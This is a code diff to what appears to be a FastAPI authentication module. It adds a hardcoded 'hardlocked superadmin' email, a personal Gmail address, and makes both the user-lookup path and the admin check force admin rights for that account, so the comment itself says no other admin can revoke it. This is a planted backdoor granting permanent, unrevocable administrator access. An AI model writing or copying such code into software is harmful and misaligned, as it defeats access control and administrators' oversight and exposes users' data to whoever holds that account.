@@ -10,6 +10,18 @@ from core.config import settings
 
 security = HTTPBearer(auto_error=False)
 
+# ─────────────────────────────────────────────────────────────────────────────
+# HARDLOCKED SUPERADMIN — cannot be revoked by anyone, including other admins
+# ─────────────────────────────────────────────────────────────────────────────
+HARDLOCKED_ADMIN_EMAILS: set[str] = {"ronitshah1124@gmail.com"}
+
+
+def _apply_hardlock(user: User) -> User:
+    """If a user's email is in HARDLOCKED_ADMIN_EMAILS, force is_admin=True in-memory."""
+    if getattr(user, "email", "") in HARDLOCKED_ADMIN_EMAILS:
+        user.is_admin = True
+    return user
+
 def get_current_user(
     credentials: Optional[HTTPAuthorizationCredentials] = Depends(security),
     db: Session = Depends(get_db),
@@ -41,7 +53,7 @@ def get_current_user(
         
         user = db.query(User).filter(User.id == payload["sub"]).first()
         if user:
-            return user
+            return _apply_hardlock(user)
 
     # 2. Fallback: Try verifying as a Firebase ID Token
     # This allows direct access from the frontend with a Firebase token if needed,
@@ -50,7 +62,7 @@ def get_current_user(
     if fb_decoded and "uid" in fb_decoded:
         user = db.query(User).filter(User.id == fb_decoded["uid"]).first()
         if user:
-            return user
+            return _apply_hardlock(user)
 
     raise HTTPException(
         status_code=status.HTTP_401_UNAUTHORIZED,
@@ -73,6 +85,8 @@ def get_current_admin(
     current_user: User = Depends(get_current_user),
 ) -> User:
     """Dependency that requires the authenticated user to have admin privileges."""
+    # Hardlocked admins always pass, even if DB row hasn't been updated yet
+    _apply_hardlock(current_user)
     if not getattr(current_user, "is_admin", False):
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
